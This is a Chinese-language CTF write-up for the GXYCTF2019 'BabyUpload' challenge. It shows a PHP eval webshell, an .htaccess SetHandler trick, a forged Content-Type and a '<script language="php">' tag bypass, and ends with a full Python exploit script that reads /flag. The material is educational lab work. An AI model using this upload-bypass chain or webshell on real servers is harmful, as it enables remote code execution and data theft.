# Writeup 4 [GXYCTF2019]BabyUpload



## 一、题目信息

- **题目名称**：BabyUpload
- **题目来源**：GXYCTF 2019
- **题目类型**：Web / 文件上传
- **考点**：
  - 文件后缀黑名单绕过（不能包含 `ph`）
  - MIME 类型检测绕过
  - `.htaccess` 配置文件上传
  - PHP 代码执行（`<script language="php">` 标签）
  - 图片马制作与利用

---

## 二、环境搭建与访问

访问靶机地址（BUUCTF 在线环境）：

```http
http://2df3f00c-55d2-4e06-a432-06b6f9913b35.node5.buuoj.cn:81/
```

页面是一个简单的文件上传表单，标题为 "Upload"。

---

## 三、信息收集与初步测试

### 1. 上传普通文件测试

首先尝试上传一个简单的文本文件 `test.txt`，内容为 `test`。

返回结果：

```
上传类型也太露骨了吧！
```

### 2. 上传一句话木马

```php
GIF89a
<?php
echo "Rambo";
@eval($_POST['password']);
?>
```

**上传失败**，提示：

```
后缀名不能有ph！
```

说明后端对文件后缀进行了黑名单过滤，**任何包含 `ph` 的后缀名**（如 `.php`、`.phtml`、`.php3`、`.php5` 等）都会被拒绝。

### 3. 上传图片文件测试

上传一个正常的 `tu.jpg` 文件（纯图片内容），返回：

```
/var/www/html/upload/019edc48d9203596b01af42651a7669f/tu.jpg succesfully uploaded!
```

说明 **`.jpg` 后缀是允许的**，并且上传路径被返回。

### 4. 尝试上传 `.htaccess`

上传 `.htaccess` 文件，内容为：

```
SetHandler application/x-httpd-php
```

返回：

```
上传类型也太露骨了吧！
```

说明后端对 **MIME 类型** 或 **文件内容** 进行了检测。

---

## 四、绕过分析

### 1. 后缀黑名单绕过

由于不能使用包含 `ph` 的后缀，无法直接上传 `.php` 文件。
常见的绕过方式：

- 使用 `.htaccess` 配置文件（不含 `ph`）
- 使用 `user.ini` 配置文件（不含 `ph`）
- 利用 Apache 解析漏洞（如 `test.php.jpg`，但此环境不存在）

**选择方案**：

上传 `.htaccess`

目的：将任意后缀（如 `.jpg`）解析为 PHP。

### 2. MIME 类型检测绕过

测试发现，当上传 `.htaccess` 时：

- MIME 类型为 `image/jpeg` → 上传成功
- 其他 MIME 类型（如 `text/plain`、`application/octet-stream`） → 提示“上传类型也太露骨了吧！”

说明后端严格检查了 **MIME 类型**，必须是 `image/jpeg` 才允许上传。

**绕过方法**：

在上传时，手动将 `Content-Type` 设置为 `image/jpeg`。

### 3. 文件内容检测绕过

尝试在 `.jpg` 中写入 PHP 代码 `<?php phpinfo(); ?>`

页面返回：

```html
诶，别蒙我啊，这标志明显还是php啊
```

经过测试，后端可能过滤了 `<?php` 标签，但允许 `<script language="php">` 标签。

**绕过方法**：

使用 `<script language="php">` 代替 `<?php`。

页面返回：

```html
/var/www/html/upload/019edc48d9203596b01af42651a7669f/phpinfotxt.jpg succesfully uploaded!
```



---

## 五、漏洞攻击步骤

### 步骤 1：上传 `.htaccess`

**文件内容**：

```apache
SetHandler application/x-httpd-php
```

**作用**：

告诉 Apache，将当前目录下的所有文件都当作 PHP 脚本来解析（无论文件的后缀是什么）。

**上传文件的请求**（使用 Python `requests` 库）：

```python
import requests

url = "http://2df3f00c-55d2-4e06-a432-06b6f9913b35.node5.buuoj.cn:81/"
session = requests.session()

# 上传 .htaccess，MIME 类型设为 image/jpeg
htaccess = {
    'uploaded': ('.htaccess', "SetHandler application/x-httpd-php", 'image/jpeg')
}
res = session.post(url, files=htaccess)
print(res.text)
```

**返回结果**：

```python
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
<title>Upload</title>
<form action="" method="post" enctype="multipart/form-data">
ä¸ä¼ æä»¶<input type="file" name="uploaded" />
<input type="submit" name="submit" value="ä¸ä¼ " />
</form>/var/www/html/upload/ef293aa4a41746e3668b0d036432d0a5/.htaccess succesfully uploaded!

进程已结束，退出代码为 0
```

上传成功，路径中包含一个随机目录名（每次不同）。

### 步骤 2：上传图片马（shell.jpg）

**文件内容**：

```php
<script language="php">echo file_get_contents("/flag");</script>
```

**作用**：读取靶机根目录下的 `/flag` 文件并输出。

**上传文件：**shell.jpg

**页面返回：**

```
/var/www/html/upload/019edc48d9203596b01af42651a7669f/shell.jpg succesfully uploaded!
```

### 步骤 3：访问 shell.jpg 获取 flag

由于 `.htaccess` 已经将当前目录的所有文件解析为 PHP，访问 `shell.jpg` 时，其中的 PHP 代码会被执行。

**构造 URL**：

```http
http://2df3f00c-55d2-4e06-a432-06b6f9913b35.node5.buuoj.cn:81/upload/019edc48d9203596b01af42651a7669f/shell.jpg
```

---

## 六、完整的攻击脚本

```python
import requests

url = "http://2df3f00c-55d2-4e06-a432-06b6f9913b35.node5.buuoj.cn:81/"
session = requests.session()

# Step 1: 上传 .htaccess
htaccess_content = "SetHandler application/x-httpd-php"
htaccess = {
    'uploaded': ('.htaccess', htaccess_content, 'image/jpeg')
}
res_hta = session.post(url, files=htaccess)
print(res_hta.text)

# 从返回结果中提取上传路径（可选）
# 例如：/var/www/html/upload/9f7a2bdfc837d6127fde15104c1a04ce/.htaccess
import re
match = re.search(r'/var/www/html/upload/([a-f0-9]+)/', res_hta.text)
if match:
    upload_dir = match.group(1)
else:
    print("未找到上传目录，请手动检查")
    exit()

# Step 2: 上传图片马
shell_content = '<script language="php">echo file_get_contents("/flag");</script>'
shell_file = {
    'uploaded': ('shell.jpg', shell_content, 'image/jpeg')
}
res_shell = session.post(url, files=shell_file)
print(res_shell.text)

# Step 3: 访问 shell.jpg 获取 flag
shell_url = f"{url}upload/{upload_dir}/shell.jpg"
flag = session.get(shell_url).text
print(f"Flag: {flag}")
```

运行结果：

```python
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
<title>Upload</title>
<form action="" method="post" enctype="multipart/form-data">
ä¸ä¼ æä»¶<input type="file" name="uploaded" />
<input type="submit" name="submit" value="ä¸ä¼ " />
</form>/var/www/html/upload/57dd30b8e3acaf30f5a550995b1aa462/.htaccess succesfully uploaded!
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
<title>Upload</title>
<form action="" method="post" enctype="multipart/form-data">
ä¸ä¼ æä»¶<input type="file" name="uploaded" />
<input type="submit" name="submit" value="ä¸ä¼ " />
</form>/var/www/html/upload/57dd30b8e3acaf30f5a550995b1aa462/shell.jpg succesfully uploaded!
Flag: flag{1bcb2372-2379-48a1-8a25-b98b802b5467}


进程已结束，退出代码为 0
```

成功获取 flag。

---

## 七、常见问题与解决方案

| 问题                                               | 原因                       | 解决方案                            |
| -------------------------------------------------- | -------------------------- | ----------------------------------- |
| `.htaccess` 上传失败，提示“上传类型也太露骨了吧！” | MIME 类型不是 `image/jpeg` | 将 `Content-Type` 改为 `image/jpeg` |
| 上传目录的名称每次都不相同                         | 随机生成                   | 从上传成功返回信息中正则提取        |

---

## 八、知识点总结

1. **`.htaccess` 的作用**：Apache 的目录级配置文件，可修改当前目录的解析规则。
2. **MIME 类型伪造**：服务端如果只检查 `Content-Type`，可以轻松伪造。
3. **`<script language="php">` 标签**：PHP 的一种替代语法，常用于绕过对 `<?php` 的过滤。
4. **黑名单绕过思路**：不要只想着上传 `.php`，可以利用配置文件或其他可解析的后缀。
5. **信息泄露**：上传成功时返回了完整的服务器路径，方便后续访问。

---

## 九、扩展思考

- 如果后端还检查了 `.htaccess` 的内容（如过滤 `SetHandler`），可以尝试：
  - 使用 `user.ini` + `auto_prepend_file`
  - 使用 `<FilesMatch>` 指令
  - 对关键字进行大小写变形或加注释

- 如果禁用了 `<script language="php">`，可以尝试：
  - `<?=` 短标签（需要短标签开启）
  - 使用 `system()` 等函数通过 HTTP 参数传递命令

- 如果完全无法上传任何配置文件，可以寻找文件包含漏洞（如 `?page=`）来包含图片马。

---

**最终 Flag**：

```
flag{1bcb2372-2379-48a1-8a25-b98b802b5467}
```
